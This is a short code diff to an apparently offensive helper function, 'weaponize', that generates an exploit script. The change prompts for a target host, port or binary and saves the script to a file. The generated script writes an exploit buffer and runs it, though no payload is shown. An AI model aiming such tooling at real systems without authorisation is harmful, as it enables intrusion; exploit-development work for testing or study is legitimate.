@@ -674,10 +674,10 @@ def weaponize(target_binary, target_platform, target_architecture, target_type, 
     script += "EXPLOIT_FILE = \"exploit.bin\"\n"
     script += "EXECUTE_EXPLOIT = True\n"
     if target_type == APP_TYPE_SERVER:
-        script += f'TARGET_ADDRESS = "" # target host\n'
-        script += f'TARGET_PORT = "" # exposed port on the target host\n'
+        script += f'TARGET_ADDRESS = "{prompt_base("what address would you like to target?")}" # target host\n'
+        script += f'TARGET_PORT = "{prompt_number("what port would you like to target?")}" # exposed port on the target host\n'
     else:
-        script += f'TARGET_BIN = "" # target binary'
+        script += f'TARGET_BIN = "{prompt_base("what binary would you like to target?")}" # target binary'
     script += "#endregion\n\n"
 
     script += "#region imports\n"
@@ -703,7 +703,7 @@ def weaponize(target_binary, target_platform, target_architecture, target_type, 
     script += "if GENERATE_EXPLOIT_FILE:\n"
     script += "    with open(EXPLOIT_FILE, \"wb\") as exploit_file:\n"
     script += "        exploit_file.write(buf)\n"
-    script += "#endregion\n"
+    script += "#endregion\n\n"
 
     script += "#region execute\n"
     script += "if EXECUTE_EXPLOIT:\n"
@@ -721,7 +721,8 @@ def weaponize(target_binary, target_platform, target_architecture, target_type, 
 
     script += "#endregion\n"
 
-    print(script)
+    with open(file_name, "w") as script_file:
+        script_file.write(script)
 #endregion
 
 if __name__ == "__main__":
